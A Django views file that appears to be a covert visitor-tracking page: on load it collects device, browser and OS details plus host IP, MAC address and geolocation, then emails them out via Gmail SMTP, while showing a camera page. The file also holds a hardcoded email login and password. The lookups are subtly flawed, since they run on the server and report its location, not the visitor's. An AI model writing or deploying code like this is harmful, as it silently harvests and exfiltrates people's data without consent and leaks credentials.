from django.http import HttpResponse, StreamingHttpResponse
from django.shortcuts import render
from django.contrib.auth.models import User
import socket
import requests
import json
import numpy as np
import uuid
import subprocess
import smtplib


def cameraprueba(request):
    return render(request, 'cam.html')


def principal(request):
    dataTotal = ''
    hostname = socket.gethostname()
    ip_host = socket.gethostbyname(hostname)
    ipv4 = requests.get(url='https://v4.ident.me/')
    ipv6 = requests.get(url='https://v6.ident.me/')
    alldata = requests.get(url=' http://ip-api.com/json/')
    data = json.loads(alldata.text)

    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                    for ele in range(0, 8*6, 8)][::-1])

    equipo = ['Mobile', 'Tablet', 'Touch', 'Pc', 'Bot']
    tipodeequipo = ''
    Browser_info = request.user_agent.browser
    SO_info = request.user_agent.os
    device_info = request.user_agent.device

    if(request.user_agent.is_mobile == True):
        tipodeequipo = equipo[0]

    elif (request.user_agent.is_tablet == True):
        tipodeequipo = equipo[1]

    elif (request.user_agent.is_touch_capable == True):
        tipodeequipo = equipo[2]

    elif (request.user_agent.is_pc == True):
        tipodeequipo = equipo[3]

    elif (request.user_agent.is_bot == True):
        tipodeequipo = equipo[4]

    dataTotal += str(tipodeequipo)+" = TipoEquipo\n"+str(Browser_info.family)+" = Navegador\n"+str(Browser_info.version_string)+" = VersionBrowser\n"+str(SO_info.family)+" = SOinfo\n"+str(SO_info.version_string)+" = VersionSO\n"+str(device_info.family)+" = DeviceInfo\n"+str(ip_host)+" = IpHost\n"+str(hostname)+" = Hostname\n"+str(ipv4.text) + \
        " = Ipv4\n"+str(data['regionName'])+" = Region\n"+str(data['isp'])+" = ISP\n"+str(data['as'])+" = ASN\n"+str(data['timezone'])+" = Timezone\n"+str(data['country']) + \
        " = País\n"+str(data['regionName'])+" = RegionName\n"+str(data['city'])+" = Ciudad\n" + \
        str(str(data['lat']))+" = Latitude\n" + \
        str(str(data['lon']))+" = Longitude\n"
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login("pruebauisek@gmail.com", "pruebauisek2020")
    server.sendmail("pruebauisek@gmail.com",
                    "pruebauisek@gmail.com", dataTotal.encode('utf-8').strip())
    server.quit()

    return render(request, 'cam.html')
